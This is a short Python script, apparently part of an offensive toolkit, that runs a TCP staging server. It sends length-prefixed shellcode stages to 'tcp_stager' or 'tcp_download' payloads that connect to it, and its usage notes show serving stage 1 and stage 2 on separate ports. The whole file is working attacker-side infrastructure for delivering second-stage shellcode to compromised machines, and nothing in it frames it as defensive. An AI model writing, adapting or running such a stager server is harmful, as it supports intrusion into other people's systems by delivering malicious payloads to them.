"""Minimal staging server for tcp_stager / tcp_download shellcode.

Serves one stage file per connection: sends [uint32 LE size][raw bytes].
Can serve different files on different ports (one listener per port).

Usage:
    # Serve stage 2 on port 9002
    python tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shellcode.bin

    # Serve two stages simultaneously
    python tcp_stage_server.py --port 9002 --file stage1.bin &
    python tcp_stage_server.py --port 9003 --file stage2.bin
"""
import argparse
import socket
import struct
import sys


def serve(port: int, path: str) -> None:
    data = open(path, "rb").read()
    payload = struct.pack("<I", len(data)) + data
    print(f"[*] Serving {path!r} ({len(data)} bytes) on 0.0.0.0:{port}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)

    while True:
        conn, addr = srv.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        try:
            conn.sendall(payload)
            print(f"[+] Sent {len(payload)} bytes")
        finally:
            conn.close()


def main() -> None:
    p = argparse.ArgumentParser(description="TCP stage server")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--file", required=True)
    args = p.parse_args()
    try:
        serve(args.port, args.file)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
        sys.exit(0)


if __name__ == "__main__":
    main()
